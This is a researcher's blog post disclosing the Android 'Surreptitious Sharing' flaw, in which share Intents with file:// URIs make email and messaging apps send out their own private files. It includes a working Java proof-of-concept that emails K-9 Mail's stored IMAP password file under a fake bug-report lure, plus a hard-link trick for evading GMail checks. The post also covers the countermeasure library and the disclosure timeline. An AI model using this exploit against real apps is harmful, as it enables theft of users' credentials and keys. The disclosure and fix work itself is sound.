---
layout: post
title: Surreptitious Sharing on Android
author: Dominik Schürmann
date: 2016-04-04
slug: surreptitious-sharing
aliases:
    - "/2016/04/04/surreptitious-sharing.html"
---

_This post has also been published at the [Insitute for Operating Systems and Computer Networks](https://www.ibr.cs.tu-bs.de/news/ibr/surreptitious-sharing-2016-04-04.xml)._


Many email and messaging apps on Android utilize the Intent API for sending files shared from other apps such as Android's gallery.
These Intents are standardized for sending and receiving content.
Instead of sending entire files, such as videos, via this API, only URIs are exchanged pointing to the actual storage position.
We found a vulnerability in this Intent API, which is present in many published communication apps allowing privilege escalation and data leakage.
In the worst case, this can possibly leak private keys stored by popular encrypted messaging apps, such as Threema, Telegram, or Signal.

While private app storages are separated via Unix file permissions, apps can always access their own private files.
Thus, a malicious app can share a URI using the <em>file</em> scheme that points to a private file of the receiving app.
Many apps, such as email and messaging clients, accept these URIs and offer to send their own private file to communication partners.
We call this vulnerability <em>Surreptitious Sharing</em>.
In this blog post, we give a short overview of how it can be exploited in practice and provide a backward compatible library as a countermeasure.


## Details
The main issue lies in the fact that apps cannot only access their private data directories using <span style="font-family:monospace;">Context.openFileOutput(String name, int mode)</span>, but also using <em>file</em> URIs.
While these URIs are normally used to access files on the SD card, via <span style="font-family:monospace;">file:///sdcard/paper.pdf</span> for example, they can also point to private files, e.g., <span style="font-family:monospace;">file:///data/data/com.example.app/files/paper.pdf</span>.
If an app registers Intent Filters to support Android's sharing API or defines custom Intents accepting URIs, they are potentially accepting <em>file</em> URIs that could also point to their own private files.
For apps facilitating communication, like email or messaging apps, this leads to what we call <em>Surreptitious Sharing</em>.
To our knowledge, a similar issue has first been documented as vulnerability OKC-01-010 in [Cure53's security audit of the OpenPGP app OpenKeychain](https://cure53.de/pentest-report_openkeychain.pdf).
While their report applies this issue to the file encryption API in OpenKeychain, we apply it in a broader context to communication apps.
Investigating the AOSP source code reveals that support for <em>file</em> URIs using <span style="font-family:monospace;">Context.openFileOutput(String name, int mode)</span> (similar checks are present in <span style="font-family:monospace;">openAssetFileDescriptor</span>) was planned to be removed (see inline comments in <span style="font-family:monospace;">openInputStream</span> method in <span style="font-family:monospace;">[ContentResolver](https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/content/ContentResolver.java)</span>).

## Research Paper
A pre-published version of our research paper, presented on [GI Sicherheit 2016](https://sicherheit2016.de), is available as [schuermann-sicherheit2016.pdf](http://www.ibr.cs.tu-bs.de/papers/schuermann-sicherheit2016.pdf).
In this paper we analyze 4 email and 8 messaging apps in detail and found that 8 out of 12 apps are vulnerable.


## Example Exploitation
This example is intended to surreptitiously share IMAP passwords of K-9 Mail with an attacker.
Please note that K-9 Mail serves only as an example, the issue has already been fixed in the current release and was present in many more apps, as discussed in our research paper.
As shown by the screenshots, a malicious app could show a screen indicating that a problem has occurred urging the user to report the bug to the developers.
Touching the button starts a malicious Intent specially crafted for a particular email client with an URI pointing to a private file of this email app, containing the IMAP password.


![](/images/surreptitious-sharing-2016-04-04-1.png)
![](/images/surreptitious-sharing-2016-04-04-2.png)

The code required to execute this attack follows:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.fsck.k9", "com.fsck.k9.activity.MessageCompose"));
i.setAction(Intent.ACTION_SEND); i.setType("text/plain");
Uri uri = Uri.parse("file:///data/data/com.fsck.k9/databases/preferences_storage");
i.putExtra(Intent.EXTRA_STREAM, uri);
i.putExtra(Intent.EXTRA_TEXT, "Hello World");
i.putExtra(Intent.EXTRA_EMAIL, new String[]{"support@company.com"});
i.putExtra(Intent.EXTRA_TEXT, "Dear support team,...");
i.putExtra(Intent.EXTRA_SUBJECT, "Bug Report");
```

To make it more difficult for a user to detect this data leakage and to circumvent protection mechanisms in GMail, a hard link can be created and named "bug-report" for example (details are available in the paper).
In the paper, we stated that "However, we were not able to exploit GMail on Android 6, maybe due to the new runtime permissions; this has not been investigated further.".
In discussions with Google engineers, it became clear that the hard link could indeed not be created on Android 6 but due to new SELinux policies.
This can be reproduced by connecting to a Android device via <span style="font-family:monospace;">adb shell</span> and then observing the output of <span style="font-family:monospace;">dmesg | grep avc</span>.


## Countermeasure
We provided a fix for app developers that checks with <span style="font-family:monospace;">fstat</span> if a file is owned by the receiving app only and then prevents the opening of it.
Due to the requirement of using <span style="font-family:monospace;">fstat</span> our Java fix was only available for Android >= 5, but thanks to cketti, the lead developer of K-9 Mail, a library has been created for backward compatibility.
We strongly recommend to use this library to fix the issue in your app: [https://github.com/cketti/SafeContentResolver](https://github.com/cketti/SafeContentResolver).

## Android N
As noted in [Commonsware's blog](https://commonsware.com/blog/2016/03/14/psa-file-scheme-ban-n-developer-preview.html), support for the <em>file</em> scheme has been removed in Android N Developer Preview.
We don't know if this has been done as a response to this vulnerability, but we suspect this change was already planned before we reported the problem, as comments inside AOSP source code already indicated upcoming changes.
Commonsware provides great blog posts how to [consume](https://commonsware.com/blog/2016/03/15/how-consume-content-uri.html) and [provide](https://commonsware.com/blog/2016/03/16/how-publish-files-via-content-uri.html) file access over <em>content</em> URIs.

## Responsible Disclosure
* 2016-01-29 Informed Google via [AOSP's bug tracker](https://code.google.com/p/android/issues/detail?id=199888) (non-public bug report)
* 2016-02-01 Informed developers of evaluated vulnerable apps: K-9 Mail, WEB.DE Mail, Skype, Threema, Signal, Telegram (except GMail, AOSP Mail, which are maintained by Google)
* 2016-04-04 Public disclosure via blog post
* 2016-04-06 Presentation on [GI Sicherheit 2016](https://sicherheit2016.de)


We like to acknowledge that the developers of K-9 Mail, WEB.DE Mail, Threema, and Telegram answered very fast while no response has been received from Microsoft.
Thus, Skype is still vulnerable.
It is important to note that we only informed developers of apps, which have been explicitly evaluated in our paper.
The issue is definitely present in many more apps besides the discussed ones.

## Acknowledgments
* [Cure53](https://cure53.de/) for discovering a similar issue in OpenKeychain, OKC-01-010
* <em>cketti</em> and <em>1 &amp; 1 Mail &amp; Media Development &amp; Technology GmbH</em> for developing a backward compatible fix
* Thanks for the bug bounties by Google and Telegram

## Contact
If you have more question, please contact [Dominik Schürmann](https://www.ibr.cs.tu-bs.de/users/schuerm/index.xml).
